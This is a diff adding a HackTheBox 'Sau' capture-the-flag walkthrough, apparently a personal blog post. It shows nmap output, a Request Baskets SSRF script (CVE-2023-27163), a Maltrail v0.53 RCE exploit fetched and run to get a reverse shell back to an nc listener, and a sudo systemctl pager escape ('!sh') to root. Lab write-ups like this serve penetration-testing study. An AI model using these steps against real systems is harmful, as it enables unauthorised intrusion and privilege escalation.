@@ -1,0 +1,120 @@
+export const meta = {
+    slug: "sau",
+    title: "Sau",
+    description: "A walkthrough in the Sau machine provided by sau123",
+    category: "walkthrough",
+    author: "Samuele Sciatore",
+    date: "2023-09-08",
+    tags: ["hacking", "pentesting", "hackthebox"]
+}
+
+![image of the machine](/assets/blog/posts/sau/profile.png)
+
+- Difficulty: Easy
+- OS: Linux
+- Creator: [sau123](https://app.hackthebox.com/users/201596)
+
+**In this walkthrough, important information such as hashes, passwords, etc. are censored (the length of the censored information can not correspond to the real length of the information)**
+
+# Enumeration
+## Nmap
+```bash title="localhost"
+nmap sau.htb          
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 13:29 CEST
+Nmap scan report for sau.htb (10.10.11.224)
+Host is up (0.058s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE
+22/tcp    open     ssh
+80/tcp    filtered http
+55555/tcp open     unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 7.60 seconds
+```
+
+## Website Analysis
+If we connect to port `55555` we notice that Requests Basket is used.
+The port `80` is not reachable.
+
+# Requests Basket
+Requests Basket `v <= 1.2.1` are vulnerable to `CVE-2023-27163`
+So we download from [GitHub a script to exploit this vulnerability.](https://github.com/entr0pie/CVE-2023-27163)
+
+```bash title="localhost"
+sh CVE-2023-27163.sh http://10.10.11.224:55555/ http://127.0.0.1:80/
+Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163  
+  
+> Creating the "****" proxy basket...  
+> Basket created!  
+> Accessing http://10.10.11.224:55555/**** now makes the server request to http://127.0.0.1:80/.  
+> Authorization: x*****
+```
+
+Go to `http://10.10.11.224:55555/****` and you will see a new page.
+
+![image of the server http](/assets/blog/posts/sau/server.png)
+
+# Mailtrail
+The new page says that are powered by `Mailtrail v 0.53`.
+By simple research, you can find an [exploit that allows RCE](https://github.com/spookier/Maltrail-v0.53-Exploit) and so to obtain a reverse shell.
+
+First start listening to a port with `nc`
+
+```bsh title="localhost"
+nc -lvp 4444
+Listening on 0.0.0.0 YOUR_PORT
+```
+
+and the run the exploit
+
+```bash title="localhost"
+python3 exploit.py YOUR_IP YOUR_PORT http://10.10.11.224:55555//*****//login  
+Running exploit on http://10.10.11.224:55555/*****/login
+```
+
+and on the port you chose you will receive a connection, we have a reverse shell.
+
+## Stabilize shell
+We get our shell!
+Now we are user `puma` and we are connected to the remote host.
+But we want to stabilize our shell to make it easy to use. I found [this tutorial](https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal?source=post_page-----3db77d07bc06--------------------------------).
+
+## User Flag
+```bash title="remotehost"
+cd /home/puma
+cat user.txt
+9********b
+```
+
+# Escalation
+```bash title="remotehost"
+puma@sau:~$ sudo -l  
+Matching Defaults entries for puma on sau:  
+env_reset, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+  
+User puma may run the following commands on sau:  
+ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+```
+
+We can run `/usr/bin/systemctl status trail.service` with `sudo` permissions without a password.
+By research, I found [a way to gain privilege root exploiting this misconfiguration](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/)
+
+Run the command
+```bash title="remotehost"
+sudo systemctl status example.service
+```
+
+and then
+```bash title="remotehost"
+!sh
+```
+
+we are root!
+
+## Root Flag
+```bash title="remotehost"
+cd /root
+cat root.txt
+1********0
+```
